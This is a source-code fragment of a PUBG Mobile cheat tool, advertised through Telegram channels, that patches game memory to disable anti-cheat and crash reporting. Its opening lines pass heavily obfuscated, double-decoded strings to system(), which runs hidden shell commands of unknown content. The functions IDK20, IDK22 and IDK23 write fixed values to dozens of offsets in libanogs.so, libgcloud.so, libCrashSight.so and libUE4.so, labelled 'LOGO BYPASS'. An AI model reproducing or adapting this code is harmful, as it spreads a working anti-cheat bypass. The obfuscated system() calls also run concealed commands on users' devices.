DL04oMWIFPvdnz0jUUfdYJgRdUOPgUvwUIOXXJfNBJ1AtU1T1wMklPrN3TE81JKwUPSfpPDAVwtNUIS1DaIIgJvRCzXe1U3N2HOw2sMNBzfXHJOAta0okMfjpJK82US9HNf4pJtjTPgz0LMIDqSjGqgRdUfXgUvdfNtXGwvwZU2yHU1dULfyON0jpwgvTIM9HN0dkPE5TUvR1srRUNSvgwfR3zWQ5H0NnPMo0KDAHUfkkH1boPfGSq2I6TtM9"))).c_str());
puts(" https://t.me/IDK_Official 𝕯𝖔𝖓𝖊 [✓]");
system(KILLERQ::KILLERQDE(KILLERQ::KILLERQDE(OBFUSCATE("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"))).c_str());
puts(" https://t.me/IDK_Official 𝕯𝖔𝖓𝖊 [✓]");
system(KILLERQ::KILLERQDE(KILLERQ::KILLERQDE(OBFUSCATE("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"))).c_str());
puts(" https://t.me/IDK_Official  𝕯𝖔𝖓𝖊 [✓]");
puts(" https://t.me/@UU_IDK 𝕯𝖔𝖓𝖊 [✓]");
puts("  LOGO BYPASS 𝕯𝖔𝖓𝖊 [✓]");
close(handle);
}
void IDK20()
{
CheckPUBGM();
MemoryHandle();
CheckPUBGMRunning();
puts(" https://t.me/IDK_Official [✓]");
puts(" https://t.me/@UU_IDK [✓]");
puts("  LOGO BYPASS [✓]");
close(handle);
}


void IDK22()
{
CheckPUBGM();
MemoryHandle();
CheckPUBGMRunning();
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2208")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2208")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C220C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2210")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2214")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AD0D8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AD0DC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AD0E0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AD0E4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2220")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2224")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C2228")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4C222C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6C38")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6D50")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6D54")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6D58")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6D5C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6D8C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6D90")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6DDC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6DF0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6E08")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4D6F24")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4A74C0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4A74C4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4A74C8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4A74CC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AB9C4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AB9C8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AB9CC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x4AB9D0")), -763363328);



WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0x16EDD4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0x16EDD8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0x16EDDC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0x16EDE0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0xA24B34")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0xA24B38")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0xA24B3C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libgcloud.so")) + Offset(AbdullaKassabMakeYouStupid("0xA24B40")), -763363328);


WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x6C91BC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x6C936C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x6CA0C8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x6CA240")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x1BD919C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x1BD9348")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x1BDA218")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x1BDA3A8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x66F42678")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x66F427F0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x66F4352C")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libCrashSight.so")) + Offset(AbdullaKassabMakeYouStupid("0x66F436DC")), -763363328);



puts(" https://t.me/IDK_Official [✓]");
puts(" https://t.me/@UU_IDK [✓]");
puts("  LOGO BYPASS [✓]");
close(handle);
}

void IDK23()
{
CheckPUBGM();
MemoryHandle();
CheckPUBGMRunning();

WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x21B5D2BC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x21B5D2E4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x21B5D2E8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x21B5D2EC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x21B5D2F0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libanogs.so")) + Offset(AbdullaKassabMakeYouStupid("0x21B5D450")), -763363328);



WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libUE4.so")) + Offset(AbdullaKassabMakeYouStupid("0x28AA82BC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libUE4.so")) + Offset(AbdullaKassabMakeYouStupid("0x28AA82E4")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libUE4.so")) + Offset(AbdullaKassabMakeYouStupid("0x28AA82E8")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libUE4.so")) + Offset(AbdullaKassabMakeYouStupid("0x28AA82EC")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libUE4.so")) + Offset(AbdullaKassabMakeYouStupid("0x28AA82F0")), -763363328);
WriteDword(GetBase(ProcessID, AbdullaKassabMakeYouStupid("libUE4.so")) + Offset(AbdullaKassabMakeYouStupid("0x28AA8450")), -763363328);


puts(" https://t.me/IDK_Official [✓]");
puts(" https://t.me/@UU_IDK [✓]");
puts("  LOGO BYPASS [✓]");
close(handle);
}